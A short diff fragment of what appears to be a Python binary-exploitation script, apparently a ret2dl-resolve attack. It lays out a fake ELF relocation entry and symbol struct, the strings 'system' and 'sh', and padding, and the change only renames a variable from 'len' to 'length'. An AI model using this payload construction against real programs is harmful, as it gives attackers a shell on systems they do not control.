@@ -65,11 +65,11 @@ buffer2 += elf32_rel		# (buf+0x14)
 buffer2 += "A" * align
 buffer2 += elf32_sym_struct 	# (buf+0x20)
 buffer2 += "system\x00"
-len = (100 - len(buffer2))
-buffer2 += "A" * len
+length = (100 - len(buffer2))
+buffer2 += "A" * length
 buffer2 += "sh\x00"
-len = (0x80 - len(buffer2)) 
-buffer2 += "A" * len
+length = (0x80 - len(buffer2)) 
+buffer2 += "A" * length
 
 payload = buffer + buffer2
 
